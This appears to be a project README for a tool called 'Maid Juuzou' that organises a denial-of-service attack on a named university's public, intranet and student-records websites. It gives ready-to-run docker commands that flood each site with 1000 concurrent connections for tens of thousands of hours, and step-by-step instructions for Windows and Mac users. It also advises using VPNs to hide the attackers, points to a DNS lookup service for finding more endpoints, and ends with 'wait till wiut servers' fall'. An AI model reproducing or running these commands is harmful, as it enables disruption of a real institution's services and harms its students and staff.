<p align="center"><img width="300" src="./docs/readme.webp"/></p>

<h2 align="center">Maid Juuzou</h2>

<p align="center">Malicious things on steroids.</p>

# Target

<p align="center"><img src="./docs/diagram.png"/></p>

# If you have kubertnetes cluster `./run_all_kuber.sh`
[Kubernetes Docs](docs/digital_ocean_kubernetes.md)

The easiest way

`docker run -d --rm alpine/bombardier -c 1000 -d 60000h -l https://wiut.uz`
<br>
`docker run -d --rm alpine/bombardier -c 1000 -d 600000h -l https://intranet.wiut.uz`
<br>
`docker run -d --rm alpine/bombardier -c 1000 -d 600000h -l https://srs.wiut.uz`
<br>

# Instruction for Windows and Mac:
1. Install Docker: https://www.docker.com/products/docker-desktop (For mac please pay attention if you download version for the correct chip)
2. Launch Docker and make sure that Docker is running
3. Go here https://github.com/mad-maids/maid.juuzou/blob/main/README.md
4. For best result use VPN :
    - Psiphon: https://psiphon.ca/ (free)
    - Secure VPN: https://www.securevpn.com/ (free)
    - Proton VPN: https://protonvpn.com/ (free)
    - SurfShark: https://surfshark.com/ (paid)
    - Clear VPN: https://clearvpn.com/ (free)
    - Nord VPN: https://nordvpn.com/ (paid)
5. Find in application Windows Command Prompt or Terminal for Mac and launch as an admin.
6. run all aims from resources.txt for winodws - `run_windows.bat` for Linux/Mac `./run_all_docker.sh ` for resources.txt  or ( .`/run_all_docker.sh your_aim_file`)
7. If you want select aims mainally . `docker run -d --rm alpine/bombardier -c 1000 -d 60000h -l https://wiut.uz` Open as many separate CMD consoles as many scripts you are going to launch (each line – one script)
8. Make sure that the process started
9. Wait till wiut servers' fall

> All endpoints can be found at: https://dnsdumpster.com